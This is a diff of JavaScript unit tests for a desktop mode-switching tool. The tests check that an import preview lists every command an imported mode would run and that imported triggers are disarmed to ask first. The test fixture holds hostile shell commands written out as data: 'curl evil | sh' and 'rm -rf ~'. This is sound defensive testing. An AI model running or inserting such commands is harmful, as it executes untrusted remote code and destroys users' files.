@@ -335,6 +335,44 @@ test("a mode carrying commands is flagged so the import can warn", () => {
   assert.equal(Model.modeHasCommands({ name: "Quiet" }), false)
 })
 
+test("an import preview names every line it would run, not just a count", () => {
+  const preview = Model.importPreview(Model.parseImport(JSON.stringify({
+    id: "evil",
+    name: "Evil",
+    applications: [{ command: "steam" }, { desktopId: "org.foo.Bar" }],
+    commands: { onActivate: ["curl evil | sh"], onDeactivate: ["rm -rf ~"] }
+  })).modes)
+
+  assert.equal(preview.length, 1)
+  assert.equal(preview[0].name, "Evil")
+  assert.deepEqual(preview[0].runs,
+    ["app  steam", "app  org.foo.Bar.desktop", "sh   curl evil | sh", "sh   rm -rf ~"])
+})
+
+test("an imported trigger arrives asking, never firing on its own", () => {
+  const parsed = Model.parseImport(JSON.stringify({
+    id: "evil",
+    name: "Evil",
+    commands: { onActivate: ["curl evil | sh"] },
+    triggers: [
+      { type: "application", value: "firefox", behavior: "auto" },
+      { type: "application", value: "slack", behavior: "ask" },
+      { type: "application", value: "steam" }
+    ]
+  }))
+
+  // The blank one counts too: "default" follows the global setting, which is
+  // "switch without asking" on a machine that turned confirmation off.
+  assert.equal(parsed.disarmed, 2)
+  assert.deepEqual(parsed.modes[0].triggers.map(t => t.behavior), ["ask", "ask", "ask"])
+
+  const config = Model.importModes(Model.defaultConfig(), parsed.modes, "copy").config
+  config.behavior.triggersEnabled = true
+  config.behavior.confirmAutomaticSwitch = false
+  const verdict = Model.evaluateTrigger(config, { windowClass: "firefox" }, { now: 1e9 })
+  assert.equal(verdict.action, "ask")
+})
+
 test("importing a duplicate id defaults to keeping both", () => {
   const config = Model.createMode(Model.defaultConfig(), { name: "Coding" }).config
   const incoming = Model.parseImport(JSON.stringify({ id: "coding", name: "Coding", description: "theirs" })).modes
@@ -852,6 +890,15 @@ test("application launches never hand a user string to a shell for parsing", () 
   const qml = read("Service.qml")
   assert.match(qml, /exec "\$@"/)
   assert.doesNotMatch(qml, /execDetached\(\["bash", "-lc", parsed/)
+})
+
+test("the import pane shows the lines it would run before anything is imported", () => {
+  const qml = read("EditorWindow.qml")
+  assert.match(qml, /Model\.importPreview/)
+  assert.match(qml, /modelData\.runs/)
+  assert.match(qml, /root\.importDisarmed/)
+  // Nothing is applied until a button is pressed.
+  assert.match(qml, /function confirmImport/)
 })
 
 test("every workspace dispatch is built from a validated reference", () => {
